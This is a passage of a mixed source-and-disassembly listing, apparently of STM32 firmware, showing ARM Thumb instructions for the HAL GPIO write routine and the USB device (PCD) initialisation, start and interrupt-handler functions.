 8001bfc:	787b      	ldrb	r3, [r7, #1]
 8001bfe:	2b00      	cmp	r3, #0
 8001c00:	d003      	beq.n	8001c0a <HAL_GPIO_WritePin+0x1e>
  {
    GPIOx->BSRR = (uint32_t)GPIO_Pin;
 8001c02:	887a      	ldrh	r2, [r7, #2]
 8001c04:	687b      	ldr	r3, [r7, #4]
 8001c06:	619a      	str	r2, [r3, #24]
  }
  else
  {
    GPIOx->BRR = (uint32_t)GPIO_Pin;
  }
}
 8001c08:	e002      	b.n	8001c10 <HAL_GPIO_WritePin+0x24>
    GPIOx->BRR = (uint32_t)GPIO_Pin;
 8001c0a:	887a      	ldrh	r2, [r7, #2]
 8001c0c:	687b      	ldr	r3, [r7, #4]
 8001c0e:	629a      	str	r2, [r3, #40]	; 0x28
}
 8001c10:	bf00      	nop
 8001c12:	370c      	adds	r7, #12
 8001c14:	46bd      	mov	sp, r7
 8001c16:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001c1a:	4770      	bx	lr

08001c1c <HAL_PCD_Init>:
  *         parameters in the PCD_InitTypeDef and initialize the associated handle.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Init(PCD_HandleTypeDef *hpcd)
{
 8001c1c:	b5f0      	push	{r4, r5, r6, r7, lr}
 8001c1e:	b08b      	sub	sp, #44	; 0x2c
 8001c20:	af06      	add	r7, sp, #24
 8001c22:	6078      	str	r0, [r7, #4]
  USB_OTG_GlobalTypeDef *USBx;
#endif /* defined (USB_OTG_FS) */
  uint8_t i;

  /* Check the PCD handle allocation */
  if (hpcd == NULL)
 8001c24:	687b      	ldr	r3, [r7, #4]
 8001c26:	2b00      	cmp	r3, #0
 8001c28:	d101      	bne.n	8001c2e <HAL_PCD_Init+0x12>
  {
    return HAL_ERROR;
 8001c2a:	2301      	movs	r3, #1
 8001c2c:	e0f8      	b.n	8001e20 <HAL_PCD_Init+0x204>

#if defined (USB_OTG_FS)
  USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  if (hpcd->State == HAL_PCD_STATE_RESET)
 8001c2e:	687b      	ldr	r3, [r7, #4]
 8001c30:	f893 32a9 	ldrb.w	r3, [r3, #681]	; 0x2a9
 8001c34:	b2db      	uxtb	r3, r3
 8001c36:	2b00      	cmp	r3, #0
 8001c38:	d106      	bne.n	8001c48 <HAL_PCD_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    hpcd->Lock = HAL_UNLOCKED;
 8001c3a:	687b      	ldr	r3, [r7, #4]
 8001c3c:	2200      	movs	r2, #0
 8001c3e:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

    /* Init the low level hardware */
    hpcd->MspInitCallback(hpcd);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_PCD_MspInit(hpcd);
 8001c42:	6878      	ldr	r0, [r7, #4]
 8001c44:	f00a fde4 	bl	800c810 <HAL_PCD_MspInit>
#endif /* (USE_HAL_PCD_REGISTER_CALLBACKS) */
  }

  hpcd->State = HAL_PCD_STATE_BUSY;
 8001c48:	687b      	ldr	r3, [r7, #4]
 8001c4a:	2203      	movs	r2, #3
 8001c4c:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    hpcd->Init.dma_enable = 0U;
  }
#endif /* defined (USB_OTG_FS) */

  /* Disable the Interrupts */
  __HAL_PCD_DISABLE(hpcd);
 8001c50:	687b      	ldr	r3, [r7, #4]
 8001c52:	681b      	ldr	r3, [r3, #0]
 8001c54:	4618      	mov	r0, r3
 8001c56:	f004 f8d4 	bl	8005e02 <USB_DisableGlobalInt>

  /*Init the Core (common init.) */
  if (USB_CoreInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001c5a:	687b      	ldr	r3, [r7, #4]
 8001c5c:	681b      	ldr	r3, [r3, #0]
 8001c5e:	603b      	str	r3, [r7, #0]
 8001c60:	687e      	ldr	r6, [r7, #4]
 8001c62:	466d      	mov	r5, sp
 8001c64:	f106 0410 	add.w	r4, r6, #16
 8001c68:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001c6a:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001c6c:	6823      	ldr	r3, [r4, #0]
 8001c6e:	602b      	str	r3, [r5, #0]
 8001c70:	1d33      	adds	r3, r6, #4
 8001c72:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001c74:	6838      	ldr	r0, [r7, #0]
 8001c76:	f004 f89c 	bl	8005db2 <USB_CoreInit>
 8001c7a:	4603      	mov	r3, r0
 8001c7c:	2b00      	cmp	r3, #0
 8001c7e:	d005      	beq.n	8001c8c <HAL_PCD_Init+0x70>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001c80:	687b      	ldr	r3, [r7, #4]
 8001c82:	2202      	movs	r2, #2
 8001c84:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001c88:	2301      	movs	r3, #1
 8001c8a:	e0c9      	b.n	8001e20 <HAL_PCD_Init+0x204>
  }

  /* Force Device Mode*/
  (void)USB_SetCurrentMode(hpcd->Instance, USB_DEVICE_MODE);
 8001c8c:	687b      	ldr	r3, [r7, #4]
 8001c8e:	681b      	ldr	r3, [r3, #0]
 8001c90:	2100      	movs	r1, #0
 8001c92:	4618      	mov	r0, r3
 8001c94:	f004 f8d0 	bl	8005e38 <USB_SetCurrentMode>

  /* Init endpoints structures */
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001c98:	2300      	movs	r3, #0
 8001c9a:	73fb      	strb	r3, [r7, #15]
 8001c9c:	e040      	b.n	8001d20 <HAL_PCD_Init+0x104>
  {
    /* Init ep structure */
    hpcd->IN_ep[i].is_in = 1U;
 8001c9e:	7bfb      	ldrb	r3, [r7, #15]
 8001ca0:	6879      	ldr	r1, [r7, #4]
 8001ca2:	1c5a      	adds	r2, r3, #1
 8001ca4:	4613      	mov	r3, r2
 8001ca6:	009b      	lsls	r3, r3, #2
 8001ca8:	4413      	add	r3, r2
 8001caa:	00db      	lsls	r3, r3, #3
 8001cac:	440b      	add	r3, r1
 8001cae:	3301      	adds	r3, #1
 8001cb0:	2201      	movs	r2, #1
 8001cb2:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].num = i;
 8001cb4:	7bfb      	ldrb	r3, [r7, #15]
 8001cb6:	6879      	ldr	r1, [r7, #4]
 8001cb8:	1c5a      	adds	r2, r3, #1
 8001cba:	4613      	mov	r3, r2
 8001cbc:	009b      	lsls	r3, r3, #2
 8001cbe:	4413      	add	r3, r2
 8001cc0:	00db      	lsls	r3, r3, #3
 8001cc2:	440b      	add	r3, r1
 8001cc4:	7bfa      	ldrb	r2, [r7, #15]
 8001cc6:	701a      	strb	r2, [r3, #0]
#if defined (USB_OTG_FS)
    hpcd->IN_ep[i].tx_fifo_num = i;
#endif /* defined (USB_OTG_FS) */
    /* Control until ep is activated */
    hpcd->IN_ep[i].type = EP_TYPE_CTRL;
 8001cc8:	7bfb      	ldrb	r3, [r7, #15]
 8001cca:	6879      	ldr	r1, [r7, #4]
 8001ccc:	1c5a      	adds	r2, r3, #1
 8001cce:	4613      	mov	r3, r2
 8001cd0:	009b      	lsls	r3, r3, #2
 8001cd2:	4413      	add	r3, r2
 8001cd4:	00db      	lsls	r3, r3, #3
 8001cd6:	440b      	add	r3, r1
 8001cd8:	3303      	adds	r3, #3
 8001cda:	2200      	movs	r2, #0
 8001cdc:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].maxpacket = 0U;
 8001cde:	7bfa      	ldrb	r2, [r7, #15]
 8001ce0:	6879      	ldr	r1, [r7, #4]
 8001ce2:	4613      	mov	r3, r2
 8001ce4:	009b      	lsls	r3, r3, #2
 8001ce6:	4413      	add	r3, r2
 8001ce8:	00db      	lsls	r3, r3, #3
 8001cea:	440b      	add	r3, r1
 8001cec:	3338      	adds	r3, #56	; 0x38
 8001cee:	2200      	movs	r2, #0
 8001cf0:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_buff = 0U;
 8001cf2:	7bfa      	ldrb	r2, [r7, #15]
 8001cf4:	6879      	ldr	r1, [r7, #4]
 8001cf6:	4613      	mov	r3, r2
 8001cf8:	009b      	lsls	r3, r3, #2
 8001cfa:	4413      	add	r3, r2
 8001cfc:	00db      	lsls	r3, r3, #3
 8001cfe:	440b      	add	r3, r1
 8001d00:	333c      	adds	r3, #60	; 0x3c
 8001d02:	2200      	movs	r2, #0
 8001d04:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_len = 0U;
 8001d06:	7bfa      	ldrb	r2, [r7, #15]
 8001d08:	6879      	ldr	r1, [r7, #4]
 8001d0a:	4613      	mov	r3, r2
 8001d0c:	009b      	lsls	r3, r3, #2
 8001d0e:	4413      	add	r3, r2
 8001d10:	00db      	lsls	r3, r3, #3
 8001d12:	440b      	add	r3, r1
 8001d14:	3340      	adds	r3, #64	; 0x40
 8001d16:	2200      	movs	r2, #0
 8001d18:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001d1a:	7bfb      	ldrb	r3, [r7, #15]
 8001d1c:	3301      	adds	r3, #1
 8001d1e:	73fb      	strb	r3, [r7, #15]
 8001d20:	7bfa      	ldrb	r2, [r7, #15]
 8001d22:	687b      	ldr	r3, [r7, #4]
 8001d24:	685b      	ldr	r3, [r3, #4]
 8001d26:	429a      	cmp	r2, r3
 8001d28:	d3b9      	bcc.n	8001c9e <HAL_PCD_Init+0x82>
  }

  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001d2a:	2300      	movs	r3, #0
 8001d2c:	73fb      	strb	r3, [r7, #15]
 8001d2e:	e044      	b.n	8001dba <HAL_PCD_Init+0x19e>
  {
    hpcd->OUT_ep[i].is_in = 0U;
 8001d30:	7bfa      	ldrb	r2, [r7, #15]
 8001d32:	6879      	ldr	r1, [r7, #4]
 8001d34:	4613      	mov	r3, r2
 8001d36:	009b      	lsls	r3, r3, #2
 8001d38:	4413      	add	r3, r2
 8001d3a:	00db      	lsls	r3, r3, #3
 8001d3c:	440b      	add	r3, r1
 8001d3e:	f203 1369 	addw	r3, r3, #361	; 0x169
 8001d42:	2200      	movs	r2, #0
 8001d44:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].num = i;
 8001d46:	7bfa      	ldrb	r2, [r7, #15]
 8001d48:	6879      	ldr	r1, [r7, #4]
 8001d4a:	4613      	mov	r3, r2
 8001d4c:	009b      	lsls	r3, r3, #2
 8001d4e:	4413      	add	r3, r2
 8001d50:	00db      	lsls	r3, r3, #3
 8001d52:	440b      	add	r3, r1
 8001d54:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8001d58:	7bfa      	ldrb	r2, [r7, #15]
 8001d5a:	701a      	strb	r2, [r3, #0]
    /* Control until ep is activated */
    hpcd->OUT_ep[i].type = EP_TYPE_CTRL;
 8001d5c:	7bfa      	ldrb	r2, [r7, #15]
 8001d5e:	6879      	ldr	r1, [r7, #4]
 8001d60:	4613      	mov	r3, r2
 8001d62:	009b      	lsls	r3, r3, #2
 8001d64:	4413      	add	r3, r2
 8001d66:	00db      	lsls	r3, r3, #3
 8001d68:	440b      	add	r3, r1
 8001d6a:	f203 136b 	addw	r3, r3, #363	; 0x16b
 8001d6e:	2200      	movs	r2, #0
 8001d70:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].maxpacket = 0U;
 8001d72:	7bfa      	ldrb	r2, [r7, #15]
 8001d74:	6879      	ldr	r1, [r7, #4]
 8001d76:	4613      	mov	r3, r2
 8001d78:	009b      	lsls	r3, r3, #2
 8001d7a:	4413      	add	r3, r2
 8001d7c:	00db      	lsls	r3, r3, #3
 8001d7e:	440b      	add	r3, r1
 8001d80:	f503 73bc 	add.w	r3, r3, #376	; 0x178
 8001d84:	2200      	movs	r2, #0
 8001d86:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_buff = 0U;
 8001d88:	7bfa      	ldrb	r2, [r7, #15]
 8001d8a:	6879      	ldr	r1, [r7, #4]
 8001d8c:	4613      	mov	r3, r2
 8001d8e:	009b      	lsls	r3, r3, #2
 8001d90:	4413      	add	r3, r2
 8001d92:	00db      	lsls	r3, r3, #3
 8001d94:	440b      	add	r3, r1
 8001d96:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 8001d9a:	2200      	movs	r2, #0
 8001d9c:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_len = 0U;
 8001d9e:	7bfa      	ldrb	r2, [r7, #15]
 8001da0:	6879      	ldr	r1, [r7, #4]
 8001da2:	4613      	mov	r3, r2
 8001da4:	009b      	lsls	r3, r3, #2
 8001da6:	4413      	add	r3, r2
 8001da8:	00db      	lsls	r3, r3, #3
 8001daa:	440b      	add	r3, r1
 8001dac:	f503 73c0 	add.w	r3, r3, #384	; 0x180
 8001db0:	2200      	movs	r2, #0
 8001db2:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001db4:	7bfb      	ldrb	r3, [r7, #15]
 8001db6:	3301      	adds	r3, #1
 8001db8:	73fb      	strb	r3, [r7, #15]
 8001dba:	7bfa      	ldrb	r2, [r7, #15]
 8001dbc:	687b      	ldr	r3, [r7, #4]
 8001dbe:	685b      	ldr	r3, [r3, #4]
 8001dc0:	429a      	cmp	r2, r3
 8001dc2:	d3b5      	bcc.n	8001d30 <HAL_PCD_Init+0x114>
  }

  /* Init Device */
  if (USB_DevInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001dc4:	687b      	ldr	r3, [r7, #4]
 8001dc6:	681b      	ldr	r3, [r3, #0]
 8001dc8:	603b      	str	r3, [r7, #0]
 8001dca:	687e      	ldr	r6, [r7, #4]
 8001dcc:	466d      	mov	r5, sp
 8001dce:	f106 0410 	add.w	r4, r6, #16
 8001dd2:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001dd4:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001dd6:	6823      	ldr	r3, [r4, #0]
 8001dd8:	602b      	str	r3, [r5, #0]
 8001dda:	1d33      	adds	r3, r6, #4
 8001ddc:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001dde:	6838      	ldr	r0, [r7, #0]
 8001de0:	f004 f837 	bl	8005e52 <USB_DevInit>
 8001de4:	4603      	mov	r3, r0
 8001de6:	2b00      	cmp	r3, #0
 8001de8:	d005      	beq.n	8001df6 <HAL_PCD_Init+0x1da>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001dea:	687b      	ldr	r3, [r7, #4]
 8001dec:	2202      	movs	r2, #2
 8001dee:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001df2:	2301      	movs	r3, #1
 8001df4:	e014      	b.n	8001e20 <HAL_PCD_Init+0x204>
  }

  hpcd->USB_Address = 0U;
 8001df6:	687b      	ldr	r3, [r7, #4]
 8001df8:	2200      	movs	r2, #0
 8001dfa:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  hpcd->State = HAL_PCD_STATE_READY;
 8001dfe:	687b      	ldr	r3, [r7, #4]
 8001e00:	2201      	movs	r2, #1
 8001e02:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9

  /* Activate LPM */
  if (hpcd->Init.lpm_enable == 1U)
 8001e06:	687b      	ldr	r3, [r7, #4]
 8001e08:	69db      	ldr	r3, [r3, #28]
 8001e0a:	2b01      	cmp	r3, #1
 8001e0c:	d102      	bne.n	8001e14 <HAL_PCD_Init+0x1f8>
  {
    (void)HAL_PCDEx_ActivateLPM(hpcd);
 8001e0e:	6878      	ldr	r0, [r7, #4]
 8001e10:	f001 fc9e 	bl	8003750 <HAL_PCDEx_ActivateLPM>
  }

  (void)USB_DevDisconnect(hpcd->Instance);
 8001e14:	687b      	ldr	r3, [r7, #4]
 8001e16:	681b      	ldr	r3, [r3, #0]
 8001e18:	4618      	mov	r0, r3
 8001e1a:	f006 fadf 	bl	80083dc <USB_DevDisconnect>

  return HAL_OK;
 8001e1e:	2300      	movs	r3, #0
}
 8001e20:	4618      	mov	r0, r3
 8001e22:	3714      	adds	r7, #20
 8001e24:	46bd      	mov	sp, r7
 8001e26:	bdf0      	pop	{r4, r5, r6, r7, pc}

08001e28 <HAL_PCD_Start>:
  * @brief  Start the USB device
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Start(PCD_HandleTypeDef *hpcd)
{
 8001e28:	b580      	push	{r7, lr}
 8001e2a:	b082      	sub	sp, #8
 8001e2c:	af00      	add	r7, sp, #0
 8001e2e:	6078      	str	r0, [r7, #4]
#if defined (USB_OTG_FS)
  USB_OTG_GlobalTypeDef *USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  __HAL_LOCK(hpcd);
 8001e30:	687b      	ldr	r3, [r7, #4]
 8001e32:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8001e36:	2b01      	cmp	r3, #1
 8001e38:	d101      	bne.n	8001e3e <HAL_PCD_Start+0x16>
 8001e3a:	2302      	movs	r3, #2
 8001e3c:	e012      	b.n	8001e64 <HAL_PCD_Start+0x3c>
 8001e3e:	687b      	ldr	r3, [r7, #4]
 8001e40:	2201      	movs	r2, #1
 8001e42:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  {
    /* Enable USB Transceiver */
    USBx->GCCFG |= USB_OTG_GCCFG_PWRDWN;
  }
#endif /* defined (USB_OTG_FS) */
  __HAL_PCD_ENABLE(hpcd);
 8001e46:	687b      	ldr	r3, [r7, #4]
 8001e48:	681b      	ldr	r3, [r3, #0]
 8001e4a:	4618      	mov	r0, r3
 8001e4c:	f003 ffc2 	bl	8005dd4 <USB_EnableGlobalInt>
  (void)USB_DevConnect(hpcd->Instance);
 8001e50:	687b      	ldr	r3, [r7, #4]
 8001e52:	681b      	ldr	r3, [r3, #0]
 8001e54:	4618      	mov	r0, r3
 8001e56:	f006 faaa 	bl	80083ae <USB_DevConnect>
  __HAL_UNLOCK(hpcd);
 8001e5a:	687b      	ldr	r3, [r7, #4]
 8001e5c:	2200      	movs	r2, #0
 8001e5e:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8001e62:	2300      	movs	r3, #0
}
 8001e64:	4618      	mov	r0, r3
 8001e66:	3708      	adds	r7, #8
 8001e68:	46bd      	mov	sp, r7
 8001e6a:	bd80      	pop	{r7, pc}

08001e6c <HAL_PCD_IRQHandler>:
  * @brief  This function handles PCD interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
void HAL_PCD_IRQHandler(PCD_HandleTypeDef *hpcd)
{
 8001e6c:	b580      	push	{r7, lr}
 8001e6e:	b084      	sub	sp, #16
 8001e70:	af00      	add	r7, sp, #0
 8001e72:	6078      	str	r0, [r7, #4]
  uint32_t wIstr = USB_ReadInterrupts(hpcd->Instance);
 8001e74:	687b      	ldr	r3, [r7, #4]
 8001e76:	681b      	ldr	r3, [r3, #0]
 8001e78:	4618      	mov	r0, r3
 8001e7a:	f006 fac4 	bl	8008406 <USB_ReadInterrupts>
 8001e7e:	60f8      	str	r0, [r7, #12]

  if ((wIstr & USB_ISTR_CTR) == USB_ISTR_CTR)
 8001e80:	68fb      	ldr	r3, [r7, #12]
 8001e82:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 8001e86:	2b00      	cmp	r3, #0
 8001e88:	d003      	beq.n	8001e92 <HAL_PCD_IRQHandler+0x26>
  {
    /* servicing of the endpoint correct transfer interrupt */
    /* clear of the CTR flag into the sub */
    (void)PCD_EP_ISR_Handler(hpcd);
 8001e8a:	6878      	ldr	r0, [r7, #4]
 8001e8c:	f000 fb59 	bl	8002542 <PCD_EP_ISR_Handler>

    return;
 8001e90:	e110      	b.n	80020b4 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_RESET) == USB_ISTR_RESET)
 8001e92:	68fb      	ldr	r3, [r7, #12]
 8001e94:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001e98:	2b00      	cmp	r3, #0
 8001e9a:	d013      	beq.n	8001ec4 <HAL_PCD_IRQHandler+0x58>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_RESET);
 8001e9c:	687b      	ldr	r3, [r7, #4]
 8001e9e:	681b      	ldr	r3, [r3, #0]
 8001ea0:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001ea4:	b29a      	uxth	r2, r3
 8001ea6:	687b      	ldr	r3, [r7, #4]
 8001ea8:	681b      	ldr	r3, [r3, #0]
 8001eaa:	f422 6280 	bic.w	r2, r2, #1024	; 0x400
 8001eae:	b292      	uxth	r2, r2
 8001eb0:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResetCallback(hpcd);
#else
    HAL_PCD_ResetCallback(hpcd);
 8001eb4:	6878      	ldr	r0, [r7, #4]
 8001eb6:	f00a fd4c 	bl	800c952 <HAL_PCD_ResetCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    (void)HAL_PCD_SetAddress(hpcd, 0U);
 8001eba:	2100      	movs	r1, #0
 8001ebc:	6878      	ldr	r0, [r7, #4]
 8001ebe:	f000 f8fc 	bl	80020ba <HAL_PCD_SetAddress>

    return;
 8001ec2:	e0f7      	b.n	80020b4 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_PMAOVR) == USB_ISTR_PMAOVR)
 8001ec4:	68fb      	ldr	r3, [r7, #12]
 8001ec6:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8001eca:	2b00      	cmp	r3, #0
 8001ecc:	d00c      	beq.n	8001ee8 <HAL_PCD_IRQHandler+0x7c>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_PMAOVR);
 8001ece:	687b      	ldr	r3, [r7, #4]
 8001ed0:	681b      	ldr	r3, [r3, #0]
 8001ed2:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001ed6:	b29a      	uxth	r2, r3
 8001ed8:	687b      	ldr	r3, [r7, #4]
 8001eda:	681b      	ldr	r3, [r3, #0]
 8001edc:	f422 4280 	bic.w	r2, r2, #16384	; 0x4000
 8001ee0:	b292      	uxth	r2, r2
 8001ee2:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001ee6:	e0e5      	b.n	80020b4 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ERR) == USB_ISTR_ERR)
 8001ee8:	68fb      	ldr	r3, [r7, #12]
 8001eea:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 8001eee:	2b00      	cmp	r3, #0
 8001ef0:	d00c      	beq.n	8001f0c <HAL_PCD_IRQHandler+0xa0>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ERR);
 8001ef2:	687b      	ldr	r3, [r7, #4]
 8001ef4:	681b      	ldr	r3, [r3, #0]
 8001ef6:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001efa:	b29a      	uxth	r2, r3
 8001efc:	687b      	ldr	r3, [r7, #4]
 8001efe:	681b      	ldr	r3, [r3, #0]
 8001f00:	f422 5200 	bic.w	r2, r2, #8192	; 0x2000
 8001f04:	b292      	uxth	r2, r2
 8001f06:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001f0a:	e0d3      	b.n	80020b4 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_WKUP) == USB_ISTR_WKUP)
 8001f0c:	68fb      	ldr	r3, [r7, #12]
 8001f0e:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8001f12:	2b00      	cmp	r3, #0
 8001f14:	d034      	beq.n	8001f80 <HAL_PCD_IRQHandler+0x114>
  {
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_LPMODE);
 8001f16:	687b      	ldr	r3, [r7, #4]
 8001f18:	681b      	ldr	r3, [r3, #0]
 8001f1a:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f1e:	b29a      	uxth	r2, r3
 8001f20:	687b      	ldr	r3, [r7, #4]
 8001f22:	681b      	ldr	r3, [r3, #0]
 8001f24:	f022 0204 	bic.w	r2, r2, #4
 8001f28:	b292      	uxth	r2, r2
 8001f2a:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_FSUSP);
 8001f2e:	687b      	ldr	r3, [r7, #4]
 8001f30:	681b      	ldr	r3, [r3, #0]
 8001f32:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f36:	b29a      	uxth	r2, r3
 8001f38:	687b      	ldr	r3, [r7, #4]
 8001f3a:	681b      	ldr	r3, [r3, #0]
 8001f3c:	f022 0208 	bic.w	r2, r2, #8
 8001f40:	b292      	uxth	r2, r2
 8001f42:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    if (hpcd->LPM_State == LPM_L1)
 8001f46:	687b      	ldr	r3, [r7, #4]
 8001f48:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8001f4c:	2b01      	cmp	r3, #1
 8001f4e:	d107      	bne.n	8001f60 <HAL_PCD_IRQHandler+0xf4>
    {
      hpcd->LPM_State = LPM_L0;
 8001f50:	687b      	ldr	r3, [r7, #4]
 8001f52:	2200      	movs	r2, #0
 8001f54:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L0_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L0_ACTIVE);
 8001f58:	2100      	movs	r1, #0
 8001f5a:	6878      	ldr	r0, [r7, #4]
 8001f5c:	f00a ffd6 	bl	800cf0c <HAL_PCDEx_LPM_Callback>
    }

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResumeCallback(hpcd);
#else
    HAL_PCD_ResumeCallback(hpcd);
 8001f60:	6878      	ldr	r0, [r7, #4]
 8001f62:	f00a fd2f 	bl	800c9c4 <HAL_PCD_ResumeCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_WKUP);
 8001f66:	687b      	ldr	r3, [r7, #4]
 8001f68:	681b      	ldr	r3, [r3, #0]
 8001f6a:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001f6e:	b29a      	uxth	r2, r3
 8001f70:	687b      	ldr	r3, [r7, #4]
 8001f72:	681b      	ldr	r3, [r3, #0]
 8001f74:	f422 5280 	bic.w	r2, r2, #4096	; 0x1000
 8001f78:	b292      	uxth	r2, r2
 8001f7a:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001f7e:	e099      	b.n	80020b4 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SUSP) == USB_ISTR_SUSP)
 8001f80:	68fb      	ldr	r3, [r7, #12]
 8001f82:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8001f86:	2b00      	cmp	r3, #0
 8001f88:	d027      	beq.n	8001fda <HAL_PCD_IRQHandler+0x16e>
  {
    /* Force low-power mode in the macrocell */
    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 8001f8a:	687b      	ldr	r3, [r7, #4]
 8001f8c:	681b      	ldr	r3, [r3, #0]
 8001f8e:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f92:	b29a      	uxth	r2, r3
 8001f94:	687b      	ldr	r3, [r7, #4]
 8001f96:	681b      	ldr	r3, [r3, #0]
 8001f98:	f042 0208 	orr.w	r2, r2, #8
 8001f9c:	b292      	uxth	r2, r2
 8001f9e:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    /* clear of the ISTR bit must be done after setting of CNTR_FSUSP */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SUSP);
 8001fa2:	687b      	ldr	r3, [r7, #4]
 8001fa4:	681b      	ldr	r3, [r3, #0]
 8001fa6:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001faa:	b29a      	uxth	r2, r3
 8001fac:	687b      	ldr	r3, [r7, #4]
 8001fae:	681b      	ldr	r3, [r3, #0]
 8001fb0:	f422 6200 	bic.w	r2, r2, #2048	; 0x800
 8001fb4:	b292      	uxth	r2, r2
 8001fb6:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 8001fba:	687b      	ldr	r3, [r7, #4]
 8001fbc:	681b      	ldr	r3, [r3, #0]
 8001fbe:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001fc2:	b29a      	uxth	r2, r3
 8001fc4:	687b      	ldr	r3, [r7, #4]
 8001fc6:	681b      	ldr	r3, [r3, #0]
 8001fc8:	f042 0204 	orr.w	r2, r2, #4
 8001fcc:	b292      	uxth	r2, r2
 8001fce:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SuspendCallback(hpcd);
#else
    HAL_PCD_SuspendCallback(hpcd);
 8001fd2:	6878      	ldr	r0, [r7, #4]
 8001fd4:	f00a fcdc 	bl	800c990 <HAL_PCD_SuspendCallback>
